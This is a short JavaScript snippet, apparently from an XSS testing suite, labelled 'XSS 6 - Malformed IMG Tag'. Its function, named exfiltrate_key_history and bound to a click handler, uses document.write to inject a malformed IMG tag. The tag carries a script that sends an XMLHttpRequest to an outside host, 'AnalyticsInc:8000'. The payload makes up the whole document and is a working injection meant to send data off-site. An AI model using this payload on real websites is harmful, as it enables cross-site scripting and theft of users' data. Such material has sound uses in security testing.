function exfiltrate_key_history() {

    // XSS 6 - Malformed IMG Tag - No Obfuscation
    // Exfiltrate data using XMLHTTP request
	var URL='<IMG """><SCRIPT>xmlhttp=new XMLHttpRequest();xmlhttp.open(\"GET\", \"http://AnalyticsInc:8000/submission.html?test=xss6\", true);xmlhttp.send(null);</SCRIPT>">';
	document.write(URL);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;